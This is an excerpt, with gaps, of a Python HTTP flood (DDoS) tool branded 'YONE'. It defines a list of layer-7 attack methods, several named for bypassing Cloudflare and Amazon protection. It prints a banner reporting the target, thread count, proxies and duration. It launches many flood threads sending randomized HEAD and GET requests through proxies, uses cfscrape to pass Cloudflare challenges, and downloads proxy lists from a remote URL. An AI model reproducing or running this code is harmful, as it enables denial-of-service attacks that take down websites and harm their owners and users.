...
l7 = ["CFB","GET","NULLGET","POST","POSTV2","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","MIX","MIXV2","BYPASS","BYPASSV2","AMAZONBYPASS","AMAZONBYPASSV2","CFBV2","KILLALL","HTTP_BETA","CFUAM"]
...
def start_attack(method, threads, event, socks_type):
    ...
    print(color.RED + "                     ╚╝  ╚═══╩╝╚═╝ ╚╩═➤ YONE   " + color.END)

    print(color.RED + "              ► Atttack His Been Distributed ◄" + color.END)

    print(color.RED + "                 ═╦═══════════════════════╦═" + color.END)

    print(color.RED + "       ╔══════════╩═══════════════════════╩══════════╗" + color.END)

    print(color.RED + "         ➤ " + color.END + color.RED + color.UNDERLINE + "TARGET" + color.END + color.RED + ":  [{}]".format(target) + color.END)
    print(color.RED + "         ➤ " + color.END + color.RED + color.UNDERLINE + "THREADS" + color.END + color.RED + ": [{}]".format(sys.argv[4]) + color.END)

    print(color.RED + "         ➤ " + color.END + color.RED + color.UNDERLINE + "PROXY" + color.END + color.RED + ":   [{}]".format(len(proxies)) + color.END)

    print(color.RED + "         ➤ " + color.END + color.RED + color.UNDERLINE + "TIME" + color.END + color.RED + ":    [{}]".format(sys.argv[7]) + color.END)

    print(color.RED + "         ➤ " + color.END + color.RED + color.UNDERLINE + "METHOD" + color.END + color.RED + ":  [{}]".format(method) + color.END)
    ...
    try:
        ...
        if method == "post":
            ...
            for _ in range(threads):
                ...
                threading.Thread(target=nullget, args=(event, socks_type), daemon=True).start()
...
def Headers(method):
    ...
    if method == "get" or method == "getv2" or method == "socket" or method == "httpfast" or method == "httpfastv2" or method == "mix" or method == "mixv2" or method == "bypass" or method == "bypassv2" or method == "amazonbypass" or method == "amazonbypassv2" or method == "cfbv2" or method == "cfuam" or method == "head":
    ...
    elif method == "nullget" or method == "cfnull":
...
def​ ​head​(​event​, ​socks_type​): 
 ​    ​proxy​ ​=​ ​Choice​(​proxies​).​strip​().​split​(​":"​) 
 ​    ​header​ ​=​ ​Headers​(​"head"​) 
 ​    ​head_host​ ​=​ ​"HEAD "​ ​+​ ​path​ ​+​ ​"?"​ ​+​ ​random_data​() ​+​ ​" HTTP/1.1​\r​\n​Host: "​ ​+​ ​target​ ​+​ ​"​\r​\n​" 
    ...
    while time.time() < timer:
        ...
        try:
            ...
            if protocol == "https":
                ...
                s = cfscrape.create_scraper(sess=s,delay=12)            
...
def downloadsocks(choice):
    ...
    if choice == "1":
        ...
        try:
            ...
            r = requests.get("https://raw.githubusercontent.com/pvyon3/httpmh/main/httpmh.txt", timeout=5)
...
def usge():
    ...
    print(color.CYAN  + "   ║ •NULLGET       ║  •CFBV2        ║   •MIX          ║"+ color.END) 

    print(color.CYAN  + "   ║                ║  •CFB          ║   •MIXV2        ║"+ color.END) 

    print(color.CYAN  + "   ║	            ║  •CFUAM        ║   •KILLALL      ║"+ color.END)

    print(color.CYAN  + "   ║ 	            ║ AMAZONBYPASSV2 ║   •SPAMMER      ║"+color.END)
